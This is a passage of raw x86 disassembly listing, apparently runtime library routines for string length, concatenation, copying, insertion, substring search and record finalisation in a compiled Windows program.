  403c3d:	8b dd                	mov    %ebp,%ebx
  403c3f:	8b c7                	mov    %edi,%eax
  403c41:	8b d3                	mov    %ebx,%edx
  403c43:	e8 68 04 00 00       	call   0x4040b0
  403c48:	56                   	push   %esi
  403c49:	8b 07                	mov    (%edi),%eax
  403c4b:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403c4f:	8b d3                	mov    %ebx,%edx
  403c51:	e8 ce f9 ff ff       	call   0x403624
  403c56:	8b d8                	mov    %eax,%ebx
  403c58:	85 db                	test   %ebx,%ebx
  403c5a:	7d 02                	jge    0x403c5e
  403c5c:	33 db                	xor    %ebx,%ebx
  403c5e:	8b c7                	mov    %edi,%eax
  403c60:	8b d3                	mov    %ebx,%edx
  403c62:	e8 49 04 00 00       	call   0x4040b0
  403c67:	81 c4 04 10 00 00    	add    $0x1004,%esp
  403c6d:	5d                   	pop    %ebp
  403c6e:	5f                   	pop    %edi
  403c6f:	5e                   	pop    %esi
  403c70:	5b                   	pop    %ebx
  403c71:	c3                   	ret
  403c72:	8b c0                	mov    %eax,%eax
  403c74:	85 c9                	test   %ecx,%ecx
  403c76:	0f 84 04 ff ff ff    	je     0x403b80
  403c7c:	50                   	push   %eax
  403c7d:	51                   	push   %ecx
  403c7e:	52                   	push   %edx
  403c7f:	e8 c4 d4 ff ff       	call   0x401148
  403c84:	85 c0                	test   %eax,%eax
  403c86:	0f 84 c4 fe ff ff    	je     0x403b50
  403c8c:	5a                   	pop    %edx
  403c8d:	ff 32                	push   (%edx)
  403c8f:	89 02                	mov    %eax,(%edx)
  403c91:	e8 c2 d4 ff ff       	call   0x401158
  403c96:	c3                   	ret
  403c97:	90                   	nop
  403c98:	31 c9                	xor    %ecx,%ecx
  403c9a:	85 d2                	test   %edx,%edx
  403c9c:	74 21                	je     0x403cbf
  403c9e:	52                   	push   %edx
  403c9f:	3a 0a                	cmp    (%edx),%cl
  403ca1:	74 17                	je     0x403cba
  403ca3:	3a 4a 01             	cmp    0x1(%edx),%cl
  403ca6:	74 11                	je     0x403cb9
  403ca8:	3a 4a 02             	cmp    0x2(%edx),%cl
  403cab:	74 0b                	je     0x403cb8
  403cad:	3a 4a 03             	cmp    0x3(%edx),%cl
  403cb0:	74 05                	je     0x403cb7
  403cb2:	83 c2 04             	add    $0x4,%edx
  403cb5:	eb e8                	jmp    0x403c9f
  403cb7:	42                   	inc    %edx
  403cb8:	42                   	inc    %edx
  403cb9:	42                   	inc    %edx
  403cba:	89 d1                	mov    %edx,%ecx
  403cbc:	5a                   	pop    %edx
  403cbd:	29 d1                	sub    %edx,%ecx
  403cbf:	e9 24 ff ff ff       	jmp    0x403be8
  403cc4:	c3                   	ret
  403cc5:	8d 40 00             	lea    0x0(%eax),%eax
  403cc8:	31 c9                	xor    %ecx,%ecx
  403cca:	85 d2                	test   %edx,%edx
  403ccc:	74 2d                	je     0x403cfb
  403cce:	52                   	push   %edx
  403ccf:	66 3b 0a             	cmp    (%edx),%cx
  403cd2:	74 20                	je     0x403cf4
  403cd4:	66 3b 4a 02          	cmp    0x2(%edx),%cx
  403cd8:	74 17                	je     0x403cf1
  403cda:	66 3b 4a 04          	cmp    0x4(%edx),%cx
  403cde:	74 0e                	je     0x403cee
  403ce0:	66 3b 4a 06          	cmp    0x6(%edx),%cx
  403ce4:	74 05                	je     0x403ceb
  403ce6:	83 c2 08             	add    $0x8,%edx
  403ce9:	eb e4                	jmp    0x403ccf
  403ceb:	83 c2 02             	add    $0x2,%edx
  403cee:	83 c2 02             	add    $0x2,%edx
  403cf1:	83 c2 02             	add    $0x2,%edx
  403cf4:	89 d1                	mov    %edx,%ecx
  403cf6:	5a                   	pop    %edx
  403cf7:	29 d1                	sub    %edx,%ecx
  403cf9:	d1 e9                	shr    $1,%ecx
  403cfb:	e9 74 ff ff ff       	jmp    0x403c74
  403d00:	c3                   	ret
  403d01:	8d 40 00             	lea    0x0(%eax),%eax
  403d04:	31 c9                	xor    %ecx,%ecx
  403d06:	8a 0a                	mov    (%edx),%cl
  403d08:	42                   	inc    %edx
  403d09:	e9 da fe ff ff       	jmp    0x403be8
  403d0e:	c3                   	ret
  403d0f:	90                   	nop
  403d10:	57                   	push   %edi
  403d11:	50                   	push   %eax
  403d12:	51                   	push   %ecx
  403d13:	89 d7                	mov    %edx,%edi
  403d15:	31 c0                	xor    %eax,%eax
  403d17:	f2 66 af             	repnz scas %es:(%edi),%ax
  403d1a:	75 02                	jne    0x403d1e
  403d1c:	f7 d1                	not    %ecx
  403d1e:	58                   	pop    %eax
  403d1f:	01 c1                	add    %eax,%ecx
  403d21:	58                   	pop    %eax
  403d22:	5f                   	pop    %edi
  403d23:	e9 4c ff ff ff       	jmp    0x403c74
  403d28:	c3                   	ret
  403d29:	8d 40 00             	lea    0x0(%eax),%eax
  403d2c:	31 c9                	xor    %ecx,%ecx
  403d2e:	85 d2                	test   %edx,%edx
  403d30:	74 03                	je     0x403d35
  403d32:	8b 4a fc             	mov    -0x4(%edx),%ecx
  403d35:	e9 ae fe ff ff       	jmp    0x403be8
  403d3a:	c3                   	ret
  403d3b:	90                   	nop
  403d3c:	85 c0                	test   %eax,%eax
  403d3e:	74 04                	je     0x403d44
  403d40:	c3                   	ret
  403d41:	90                   	nop
  403d42:	00 00                	add    %al,(%eax)
  403d44:	b8 42 3d 40 00       	mov    $0x403d42,%eax
  403d49:	c3                   	ret
  403d4a:	8b c0                	mov    %eax,%eax
  403d4c:	85 c0                	test   %eax,%eax
  403d4e:	74 05                	je     0x403d55
  403d50:	8b 40 fc             	mov    -0x4(%eax),%eax
  403d53:	d1 e8                	shr    $1,%eax
  403d55:	c3                   	ret
  403d56:	8b c0                	mov    %eax,%eax
  403d58:	53                   	push   %ebx
  403d59:	56                   	push   %esi
  403d5a:	57                   	push   %edi
  403d5b:	55                   	push   %ebp
  403d5c:	51                   	push   %ecx
  403d5d:	8b ea                	mov    %edx,%ebp
  403d5f:	89 04 24             	mov    %eax,(%esp)
  403d62:	8b c5                	mov    %ebp,%eax
  403d64:	e8 e3 ff ff ff       	call   0x403d4c
  403d69:	8b d8                	mov    %eax,%ebx
  403d6b:	85 db                	test   %ebx,%ebx
  403d6d:	74 42                	je     0x403db1
  403d6f:	8b 04 24             	mov    (%esp),%eax
  403d72:	8b 00                	mov    (%eax),%eax
  403d74:	e8 d3 ff ff ff       	call   0x403d4c
  403d79:	8b f0                	mov    %eax,%esi
  403d7b:	8d 04 33             	lea    (%ebx,%esi,1),%eax
  403d7e:	e8 d5 fd ff ff       	call   0x403b58
  403d83:	8b f8                	mov    %eax,%edi
  403d85:	85 f6                	test   %esi,%esi
  403d87:	7e 10                	jle    0x403d99
  403d89:	8b ce                	mov    %esi,%ecx
  403d8b:	03 c9                	add    %ecx,%ecx
  403d8d:	8b d7                	mov    %edi,%edx
  403d8f:	8b 04 24             	mov    (%esp),%eax
  403d92:	8b 00                	mov    (%eax),%eax
  403d94:	e8 8f e8 ff ff       	call   0x402628
  403d99:	8b cb                	mov    %ebx,%ecx
  403d9b:	03 c9                	add    %ecx,%ecx
  403d9d:	8d 14 77             	lea    (%edi,%esi,2),%edx
  403da0:	8b c5                	mov    %ebp,%eax
  403da2:	e8 81 e8 ff ff       	call   0x402628
  403da7:	8b 04 24             	mov    (%esp),%eax
  403daa:	8b d7                	mov    %edi,%edx
  403dac:	e8 bf fd ff ff       	call   0x403b70
  403db1:	5a                   	pop    %edx
  403db2:	5d                   	pop    %ebp
  403db3:	5f                   	pop    %edi
  403db4:	5e                   	pop    %esi
  403db5:	5b                   	pop    %ebx
  403db6:	c3                   	ret
  403db7:	90                   	nop
  403db8:	53                   	push   %ebx
  403db9:	56                   	push   %esi
  403dba:	57                   	push   %edi
  403dbb:	55                   	push   %ebp
  403dbc:	83 c4 f8             	add    $0xfffffff8,%esp
  403dbf:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403dc3:	8b ea                	mov    %edx,%ebp
  403dc5:	89 04 24             	mov    %eax,(%esp)
  403dc8:	8b c5                	mov    %ebp,%eax
  403dca:	e8 7d ff ff ff       	call   0x403d4c
  403dcf:	8b d8                	mov    %eax,%ebx
  403dd1:	8b 44 24 04          	mov    0x4(%esp),%eax
  403dd5:	e8 72 ff ff ff       	call   0x403d4c
  403dda:	8b f0                	mov    %eax,%esi
  403ddc:	85 db                	test   %ebx,%ebx
  403dde:	75 04                	jne    0x403de4
  403de0:	85 f6                	test   %esi,%esi
  403de2:	74 31                	je     0x403e15
  403de4:	8d 04 1e             	lea    (%esi,%ebx,1),%eax
  403de7:	e8 6c fd ff ff       	call   0x403b58
  403dec:	8b f8                	mov    %eax,%edi
  403dee:	8b cb                	mov    %ebx,%ecx
  403df0:	03 c9                	add    %ecx,%ecx
  403df2:	8b d7                	mov    %edi,%edx
  403df4:	8b c5                	mov    %ebp,%eax
  403df6:	e8 2d e8 ff ff       	call   0x402628
  403dfb:	8b ce                	mov    %esi,%ecx
  403dfd:	03 c9                	add    %ecx,%ecx
  403dff:	8d 14 5f             	lea    (%edi,%ebx,2),%edx
  403e02:	8b 44 24 04          	mov    0x4(%esp),%eax
  403e06:	e8 1d e8 ff ff       	call   0x402628
  403e0b:	8b 04 24             	mov    (%esp),%eax
  403e0e:	8b d7                	mov    %edi,%edx
  403e10:	e8 5b fd ff ff       	call   0x403b70
  403e15:	59                   	pop    %ecx
  403e16:	5a                   	pop    %edx
  403e17:	5d                   	pop    %ebp
  403e18:	5f                   	pop    %edi
  403e19:	5e                   	pop    %esi
  403e1a:	5b                   	pop    %ebx
  403e1b:	c3                   	ret
  403e1c:	53                   	push   %ebx
  403e1d:	56                   	push   %esi
  403e1e:	52                   	push   %edx
  403e1f:	50                   	push   %eax
  403e20:	89 d3                	mov    %edx,%ebx
  403e22:	31 c0                	xor    %eax,%eax
  403e24:	8b 4c 94 10          	mov    0x10(%esp,%edx,4),%ecx
  403e28:	85 c9                	test   %ecx,%ecx
  403e2a:	74 03                	je     0x403e2f
  403e2c:	03 41 fc             	add    -0x4(%ecx),%eax
  403e2f:	4a                   	dec    %edx
  403e30:	75 f2                	jne    0x403e24
  403e32:	d1 e8                	shr    $1,%eax
  403e34:	e8 1f fd ff ff       	call   0x403b58
  403e39:	50                   	push   %eax
  403e3a:	89 c6                	mov    %eax,%esi
  403e3c:	8b 44 9c 14          	mov    0x14(%esp,%ebx,4),%eax
  403e40:	89 f2                	mov    %esi,%edx
  403e42:	85 c0                	test   %eax,%eax
  403e44:	74 0a                	je     0x403e50
  403e46:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403e49:	01 ce                	add    %ecx,%esi
  403e4b:	e8 d8 e7 ff ff       	call   0x402628
  403e50:	4b                   	dec    %ebx
  403e51:	75 e9                	jne    0x403e3c
  403e53:	5a                   	pop    %edx
  403e54:	58                   	pop    %eax
  403e55:	e8 16 fd ff ff       	call   0x403b70
  403e5a:	5a                   	pop    %edx
  403e5b:	5e                   	pop    %esi
  403e5c:	5b                   	pop    %ebx
  403e5d:	58                   	pop    %eax
  403e5e:	8d 24 94             	lea    (%esp,%edx,4),%esp
  403e61:	ff e0                	jmp    *%eax
  403e63:	c3                   	ret
  403e64:	53                   	push   %ebx
  403e65:	56                   	push   %esi
  403e66:	57                   	push   %edi
  403e67:	89 c6                	mov    %eax,%esi
  403e69:	89 d7                	mov    %edx,%edi
  403e6b:	39 d0                	cmp    %edx,%eax
  403e6d:	74 72                	je     0x403ee1
  403e6f:	85 f6                	test   %esi,%esi
  403e71:	74 51                	je     0x403ec4
  403e73:	85 ff                	test   %edi,%edi
  403e75:	74 54                	je     0x403ecb
  403e77:	8b 46 fc             	mov    -0x4(%esi),%eax
  403e7a:	8b 57 fc             	mov    -0x4(%edi),%edx
  403e7d:	29 d0                	sub    %edx,%eax
  403e7f:	77 02                	ja     0x403e83
  403e81:	01 c2                	add    %eax,%edx
  403e83:	52                   	push   %edx
  403e84:	c1 ea 02             	shr    $0x2,%edx
  403e87:	74 26                	je     0x403eaf
  403e89:	8b 0e                	mov    (%esi),%ecx
  403e8b:	8b 1f                	mov    (%edi),%ebx
  403e8d:	39 d9                	cmp    %ebx,%ecx
  403e8f:	75 41                	jne    0x403ed2
  403e91:	4a                   	dec    %edx
  403e92:	74 15                	je     0x403ea9
  403e94:	8b 4e 04             	mov    0x4(%esi),%ecx
  403e97:	8b 5f 04             	mov    0x4(%edi),%ebx
  403e9a:	39 d9                	cmp    %ebx,%ecx
  403e9c:	75 34                	jne    0x403ed2
  403e9e:	83 c6 08             	add    $0x8,%esi
  403ea1:	83 c7 08             	add    $0x8,%edi
  403ea4:	4a                   	dec    %edx
  403ea5:	75 e2                	jne    0x403e89
  403ea7:	eb 06                	jmp    0x403eaf
  403ea9:	83 c6 04             	add    $0x4,%esi
  403eac:	83 c7 04             	add    $0x4,%edi
  403eaf:	5a                   	pop    %edx
  403eb0:	83 e2 02             	and    $0x2,%edx
  403eb3:	74 0b                	je     0x403ec0
  403eb5:	66 8b 0e             	mov    (%esi),%cx
  403eb8:	66 8b 1f             	mov    (%edi),%bx
  403ebb:	66 39 d9             	cmp    %bx,%cx
  403ebe:	75 21                	jne    0x403ee1
  403ec0:	01 c0                	add    %eax,%eax
  403ec2:	eb 1d                	jmp    0x403ee1
  403ec4:	8b 57 fc             	mov    -0x4(%edi),%edx
  403ec7:	29 d0                	sub    %edx,%eax
  403ec9:	eb 16                	jmp    0x403ee1
  403ecb:	8b 46 fc             	mov    -0x4(%esi),%eax
  403ece:	29 d0                	sub    %edx,%eax
  403ed0:	eb 0f                	jmp    0x403ee1
  403ed2:	5a                   	pop    %edx
  403ed3:	66 39 d9             	cmp    %bx,%cx
  403ed6:	75 09                	jne    0x403ee1
  403ed8:	c1 e9 10             	shr    $0x10,%ecx
  403edb:	c1 eb 10             	shr    $0x10,%ebx
  403ede:	66 39 d9             	cmp    %bx,%cx
  403ee1:	5f                   	pop    %edi
  403ee2:	5e                   	pop    %esi
  403ee3:	5b                   	pop    %ebx
  403ee4:	c3                   	ret
  403ee5:	8d 40 00             	lea    0x0(%eax),%eax
  403ee8:	55                   	push   %ebp
  403ee9:	8b ec                	mov    %esp,%ebp
  403eeb:	53                   	push   %ebx
  403eec:	56                   	push   %esi
  403eed:	57                   	push   %edi
  403eee:	8b f9                	mov    %ecx,%edi
  403ef0:	8b da                	mov    %edx,%ebx
  403ef2:	8b f0                	mov    %eax,%esi
  403ef4:	8b c6                	mov    %esi,%eax
  403ef6:	e8 51 fe ff ff       	call   0x403d4c
  403efb:	83 fb 01             	cmp    $0x1,%ebx
  403efe:	7d 04                	jge    0x403f04
  403f00:	33 db                	xor    %ebx,%ebx
  403f02:	eb 07                	jmp    0x403f0b
  403f04:	4b                   	dec    %ebx
  403f05:	3b c3                	cmp    %ebx,%eax
  403f07:	7d 02                	jge    0x403f0b
  403f09:	8b d8                	mov    %eax,%ebx
  403f0b:	85 ff                	test   %edi,%edi
  403f0d:	7d 04                	jge    0x403f13
  403f0f:	33 c0                	xor    %eax,%eax
  403f11:	eb 08                	jmp    0x403f1b
  403f13:	2b c3                	sub    %ebx,%eax
  403f15:	3b f8                	cmp    %eax,%edi
  403f17:	7d 02                	jge    0x403f1b
  403f19:	8b c7                	mov    %edi,%eax
  403f1b:	8b d3                	mov    %ebx,%edx
  403f1d:	03 d2                	add    %edx,%edx
  403f1f:	03 d6                	add    %esi,%edx
  403f21:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403f24:	91                   	xchg   %eax,%ecx
  403f25:	e8 4a fd ff ff       	call   0x403c74
  403f2a:	5f                   	pop    %edi
  403f2b:	5e                   	pop    %esi
  403f2c:	5b                   	pop    %ebx
  403f2d:	5d                   	pop    %ebp
  403f2e:	c2 04 00             	ret    $0x4
  403f31:	8d 40 00             	lea    0x0(%eax),%eax
  403f34:	53                   	push   %ebx
  403f35:	56                   	push   %esi
  403f36:	57                   	push   %edi
  403f37:	55                   	push   %ebp
  403f38:	51                   	push   %ecx
  403f39:	8b f9                	mov    %ecx,%edi
  403f3b:	8b da                	mov    %edx,%ebx
  403f3d:	8b e8                	mov    %eax,%ebp
  403f3f:	8b 45 00             	mov    0x0(%ebp),%eax
  403f42:	e8 05 fe ff ff       	call   0x403d4c
  403f47:	8b f0                	mov    %eax,%esi
  403f49:	85 f6                	test   %esi,%esi
  403f4b:	7e 6e                	jle    0x403fbb
  403f4d:	83 fb 01             	cmp    $0x1,%ebx
  403f50:	7c 69                	jl     0x403fbb
  403f52:	3b f3                	cmp    %ebx,%esi
  403f54:	7c 65                	jl     0x403fbb
  403f56:	85 ff                	test   %edi,%edi
  403f58:	7e 61                	jle    0x403fbb
  403f5a:	4b                   	dec    %ebx
  403f5b:	8b c6                	mov    %esi,%eax
  403f5d:	2b c3                	sub    %ebx,%eax
  403f5f:	2b c7                	sub    %edi,%eax
  403f61:	8b f8                	mov    %eax,%edi
  403f63:	85 ff                	test   %edi,%edi
  403f65:	7d 02                	jge    0x403f69
  403f67:	33 ff                	xor    %edi,%edi
  403f69:	85 db                	test   %ebx,%ebx
  403f6b:	75 0b                	jne    0x403f78
  403f6d:	85 ff                	test   %edi,%edi
  403f6f:	75 07                	jne    0x403f78
  403f71:	33 c0                	xor    %eax,%eax
  403f73:	89 04 24             	mov    %eax,(%esp)
  403f76:	eb 39                	jmp    0x403fb1
  403f78:	8d 04 1f             	lea    (%edi,%ebx,1),%eax
  403f7b:	e8 d8 fb ff ff       	call   0x403b58
  403f80:	89 04 24             	mov    %eax,(%esp)
  403f83:	85 db                	test   %ebx,%ebx
  403f85:	7e 0f                	jle    0x403f96
  403f87:	8b cb                	mov    %ebx,%ecx
  403f89:	03 c9                	add    %ecx,%ecx
  403f8b:	8b 14 24             	mov    (%esp),%edx
  403f8e:	8b 45 00             	mov    0x0(%ebp),%eax
  403f91:	e8 92 e6 ff ff       	call   0x402628
  403f96:	85 ff                	test   %edi,%edi
  403f98:	7e 17                	jle    0x403fb1
  403f9a:	2b f7                	sub    %edi,%esi
  403f9c:	8b 45 00             	mov    0x0(%ebp),%eax
  403f9f:	8d 04 70             	lea    (%eax,%esi,2),%eax
  403fa2:	8b cf                	mov    %edi,%ecx
  403fa4:	03 c9                	add    %ecx,%ecx
  403fa6:	8b 14 24             	mov    (%esp),%edx
  403fa9:	8d 14 5a             	lea    (%edx,%ebx,2),%edx
  403fac:	e8 77 e6 ff ff       	call   0x402628
  403fb1:	8b c5                	mov    %ebp,%eax
  403fb3:	8b 14 24             	mov    (%esp),%edx
  403fb6:	e8 b5 fb ff ff       	call   0x403b70
  403fbb:	5a                   	pop    %edx
  403fbc:	5d                   	pop    %ebp
  403fbd:	5f                   	pop    %edi
  403fbe:	5e                   	pop    %esi
  403fbf:	5b                   	pop    %ebx
  403fc0:	c3                   	ret
  403fc1:	8d 40 00             	lea    0x0(%eax),%eax
  403fc4:	53                   	push   %ebx
  403fc5:	56                   	push   %esi
  403fc6:	57                   	push   %edi
  403fc7:	55                   	push   %ebp
  403fc8:	83 c4 f8             	add    $0xfffffff8,%esp
  403fcb:	8b d9                	mov    %ecx,%ebx
  403fcd:	89 54 24 04          	mov    %edx,0x4(%esp)
  403fd1:	89 04 24             	mov    %eax,(%esp)
  403fd4:	8b 04 24             	mov    (%esp),%eax
  403fd7:	e8 70 fd ff ff       	call   0x403d4c
  403fdc:	8b f0                	mov    %eax,%esi
  403fde:	85 f6                	test   %esi,%esi
  403fe0:	7e 75                	jle    0x404057
  403fe2:	8b 44 24 04          	mov    0x4(%esp),%eax
  403fe6:	8b 00                	mov    (%eax),%eax
  403fe8:	e8 5f fd ff ff       	call   0x403d4c
  403fed:	8b f8                	mov    %eax,%edi
  403fef:	83 fb 01             	cmp    $0x1,%ebx
  403ff2:	7d 04                	jge    0x403ff8
  403ff4:	33 db                	xor    %ebx,%ebx
  403ff6:	eb 07                	jmp    0x403fff
  403ff8:	4b                   	dec    %ebx
  403ff9:	3b fb                	cmp    %ebx,%edi
  403ffb:	7d 02                	jge    0x403fff
  403ffd:	8b df                	mov    %edi,%ebx
  403fff:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  404002:	e8 51 fb ff ff       	call   0x403b58
  404007:	8b e8                	mov    %eax,%ebp
  404009:	85 db                	test   %ebx,%ebx
  40400b:	7e 11                	jle    0x40401e
  40400d:	8b cb                	mov    %ebx,%ecx
  40400f:	03 c9                	add    %ecx,%ecx
  404011:	8b d5                	mov    %ebp,%edx
  404013:	8b 44 24 04          	mov    0x4(%esp),%eax
  404017:	8b 00                	mov    (%eax),%eax
  404019:	e8 0a e6 ff ff       	call   0x402628
  40401e:	8b ce                	mov    %esi,%ecx
  404020:	03 c9                	add    %ecx,%ecx
  404022:	8d 54 5d 00          	lea    0x0(%ebp,%ebx,2),%edx
  404026:	8b 04 24             	mov    (%esp),%eax
  404029:	e8 fa e5 ff ff       	call   0x402628
  40402e:	3b fb                	cmp    %ebx,%edi
  404030:	7e 1a                	jle    0x40404c
  404032:	03 f3                	add    %ebx,%esi
  404034:	8d 54 75 00          	lea    0x0(%ebp,%esi,2),%edx
  404038:	2b fb                	sub    %ebx,%edi
  40403a:	8b cf                	mov    %edi,%ecx
  40403c:	03 c9                	add    %ecx,%ecx
  40403e:	8b 44 24 04          	mov    0x4(%esp),%eax
  404042:	8b 00                	mov    (%eax),%eax
  404044:	8d 04 58             	lea    (%eax,%ebx,2),%eax
  404047:	e8 dc e5 ff ff       	call   0x402628
  40404c:	8b 44 24 04          	mov    0x4(%esp),%eax
  404050:	8b d5                	mov    %ebp,%edx
  404052:	e8 19 fb ff ff       	call   0x403b70
  404057:	59                   	pop    %ecx
  404058:	5a                   	pop    %edx
  404059:	5d                   	pop    %ebp
  40405a:	5f                   	pop    %edi
  40405b:	5e                   	pop    %esi
  40405c:	5b                   	pop    %ebx
  40405d:	c3                   	ret
  40405e:	8b c0                	mov    %eax,%eax
  404060:	85 c0                	test   %eax,%eax
  404062:	74 4b                	je     0x4040af
  404064:	85 d2                	test   %edx,%edx
  404066:	74 3a                	je     0x4040a2
  404068:	53                   	push   %ebx
  404069:	56                   	push   %esi
  40406a:	57                   	push   %edi
  40406b:	89 c6                	mov    %eax,%esi
  40406d:	89 d7                	mov    %edx,%edi
  40406f:	8b 4f fc             	mov    -0x4(%edi),%ecx
  404072:	d1 e9                	shr    $1,%ecx
  404074:	57                   	push   %edi
  404075:	8b 56 fc             	mov    -0x4(%esi),%edx
  404078:	d1 ea                	shr    $1,%edx
  40407a:	4a                   	dec    %edx
  40407b:	78 20                	js     0x40409d
  40407d:	66 8b 06             	mov    (%esi),%ax
  404080:	83 c6 02             	add    $0x2,%esi
  404083:	29 d1                	sub    %edx,%ecx
  404085:	7e 16                	jle    0x40409d
  404087:	f2 66 af             	repnz scas %es:(%edi),%ax
  40408a:	75 11                	jne    0x40409d
  40408c:	89 cb                	mov    %ecx,%ebx
  40408e:	56                   	push   %esi
  40408f:	57                   	push   %edi
  404090:	89 d1                	mov    %edx,%ecx
  404092:	f3 66 a7             	repz cmpsw %es:(%edi),%ds:(%esi)
  404095:	5f                   	pop    %edi
  404096:	5e                   	pop    %esi
  404097:	74 0c                	je     0x4040a5
  404099:	89 d9                	mov    %ebx,%ecx
  40409b:	eb ea                	jmp    0x404087
  40409d:	5a                   	pop    %edx
  40409e:	31 c0                	xor    %eax,%eax
  4040a0:	eb 0a                	jmp    0x4040ac
  4040a2:	31 c0                	xor    %eax,%eax
  4040a4:	c3                   	ret
  4040a5:	5a                   	pop    %edx
  4040a6:	89 f8                	mov    %edi,%eax
  4040a8:	29 d0                	sub    %edx,%eax
  4040aa:	d1 e8                	shr    $1,%eax
  4040ac:	5f                   	pop    %edi
  4040ad:	5e                   	pop    %esi
  4040ae:	5b                   	pop    %ebx
  4040af:	c3                   	ret
  4040b0:	53                   	push   %ebx
  4040b1:	56                   	push   %esi
  4040b2:	57                   	push   %edi
  4040b3:	8b f2                	mov    %edx,%esi
  4040b5:	8b f8                	mov    %eax,%edi
  4040b7:	33 db                	xor    %ebx,%ebx
  4040b9:	85 f6                	test   %esi,%esi
  4040bb:	7e 27                	jle    0x4040e4
  4040bd:	8b c6                	mov    %esi,%eax
  4040bf:	e8 94 fa ff ff       	call   0x403b58
  4040c4:	8b d8                	mov    %eax,%ebx
  4040c6:	8b 07                	mov    (%edi),%eax
  4040c8:	e8 7f fc ff ff       	call   0x403d4c
  4040cd:	85 c0                	test   %eax,%eax
  4040cf:	7e 13                	jle    0x4040e4
  4040d1:	3b f0                	cmp    %eax,%esi
  4040d3:	7d 02                	jge    0x4040d7
  4040d5:	8b c6                	mov    %esi,%eax
  4040d7:	8b c8                	mov    %eax,%ecx
  4040d9:	03 c9                	add    %ecx,%ecx
  4040db:	8b d3                	mov    %ebx,%edx
  4040dd:	8b 07                	mov    (%edi),%eax
  4040df:	e8 44 e5 ff ff       	call   0x402628
  4040e4:	8b c7                	mov    %edi,%eax
  4040e6:	8b d3                	mov    %ebx,%edx
  4040e8:	e8 83 fa ff ff       	call   0x403b70
  4040ed:	5f                   	pop    %edi
  4040ee:	5e                   	pop    %esi
  4040ef:	5b                   	pop    %ebx
  4040f0:	c3                   	ret
  4040f1:	8d 40 00             	lea    0x0(%eax),%eax
  4040f4:	8b 10                	mov    (%eax),%edx
  4040f6:	85 d2                	test   %edx,%edx
  4040f8:	74 18                	je     0x404112
  4040fa:	50                   	push   %eax
  4040fb:	8b 4a fc             	mov    -0x4(%edx),%ecx
  4040fe:	d1 e9                	shr    $1,%ecx
  404100:	51                   	push   %ecx
  404101:	52                   	push   %edx
  404102:	e8 41 d0 ff ff       	call   0x401148
  404107:	5a                   	pop    %edx
  404108:	85 c0                	test   %eax,%eax
  40410a:	0f 84 40 fa ff ff    	je     0x403b50
  404110:	89 02                	mov    %eax,(%edx)
  404112:	c3                   	ret
  404113:	90                   	nop
  404114:	31 c9                	xor    %ecx,%ecx
  404116:	53                   	push   %ebx
  404117:	8a 4a 01             	mov    0x1(%edx),%cl
  40411a:	56                   	push   %esi
  40411b:	57                   	push   %edi
  40411c:	89 c3                	mov    %eax,%ebx
  40411e:	8d 74 11 0a          	lea    0xa(%ecx,%edx,1),%esi
  404122:	8b 7c 11 06          	mov    0x6(%ecx,%edx,1),%edi
  404126:	8b 16                	mov    (%esi),%edx
  404128:	8b 46 04             	mov    0x4(%esi),%eax
  40412b:	01 d8                	add    %ebx,%eax
  40412d:	8b 12                	mov    (%edx),%edx
  40412f:	b9 01 00 00 00       	mov    $0x1,%ecx
  404134:	e8 0b 00 00 00       	call   0x404144
  404139:	83 c6 08             	add    $0x8,%esi
  40413c:	4f                   	dec    %edi
  40413d:	7f e7                	jg     0x404126
  40413f:	5f                   	pop    %edi
  404140:	5e                   	pop    %esi
  404141:	5b                   	pop    %ebx
  404142:	c3                   	ret
  404143:	90                   	nop
  404144:	85 c9                	test   %ecx,%ecx
  404146:	0f 84 8a 00 00 00    	je     0x4041d6
  40414c:	53                   	push   %ebx
  40414d:	56                   	push   %esi
  40414e:	57                   	push   %edi
  40414f:	89 c3                	mov    %eax,%ebx
  404151:	89 d6                	mov    %edx,%esi
  404153:	89 cf                	mov    %ecx,%edi
  404155:	31 d2                	xor    %edx,%edx
  404157:	8a 06                	mov    (%esi),%al
  404159:	8a 56 01             	mov    0x1(%esi),%dl
  40415c:	31 c9                	xor    %ecx,%ecx
  40415e:	3c 0a                	cmp    $0xa,%al
  404160:	74 22                	je     0x404184
  404162:	3c 0b                	cmp    $0xb,%al
  404164:	74 1e                	je     0x404184
  404166:	3c 0c                	cmp    $0xc,%al
  404168:	74 24                	je     0x40418e
  40416a:	3c 0d                	cmp    $0xd,%al
  40416c:	74 33                	je     0x4041a1
  40416e:	3c 0e                	cmp    $0xe,%al
  404170:	74 4d                	je     0x4041bf
  404172:	3c 0f                	cmp    $0xf,%al
  404174:	74 0e                	je     0x404184
  404176:	3c 11                	cmp    $0x11,%al
  404178:	74 0a                	je     0x404184
  40417a:	b0 02                	mov    $0x2,%al
  40417c:	5f                   	pop    %edi
  40417d:	5e                   	pop    %esi
  40417e:	5b                   	pop    %ebx
  40417f:	e9 90 e4 ff ff       	jmp    0x402614
  404184:	89 0b                	mov    %ecx,(%ebx)
  404186:	83 c3 04             	add    $0x4,%ebx
  404189:	4f                   	dec    %edi
  40418a:	7f f8                	jg     0x404184
  40418c:	eb 45                	jmp    0x4041d3
  40418e:	89 0b                	mov    %ecx,(%ebx)
  404190:	89 4b 04             	mov    %ecx,0x4(%ebx)
  404193:	89 4b 08             	mov    %ecx,0x8(%ebx)
  404196:	89 4b 0c             	mov    %ecx,0xc(%ebx)
  404199:	83 c3 10             	add    $0x10,%ebx
  40419c:	4f                   	dec    %edi
  40419d:	7f ef                	jg     0x40418e
  40419f:	eb 32                	jmp    0x4041d3
  4041a1:	55                   	push   %ebp
  4041a2:	89 d5                	mov    %edx,%ebp
  4041a4:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  4041a8:	89 d8                	mov    %ebx,%eax
  4041aa:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4041ae:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  4041b2:	8b 12                	mov    (%edx),%edx
  4041b4:	e8 8b ff ff ff       	call   0x404144
  4041b9:	4f                   	dec    %edi
  4041ba:	7f e8                	jg     0x4041a4
  4041bc:	5d                   	pop    %ebp
  4041bd:	eb 14                	jmp    0x4041d3
  4041bf:	55                   	push   %ebp
  4041c0:	89 d5                	mov    %edx,%ebp
  4041c2:	89 d8                	mov    %ebx,%eax
  4041c4:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4041c8:	89 f2                	mov    %esi,%edx
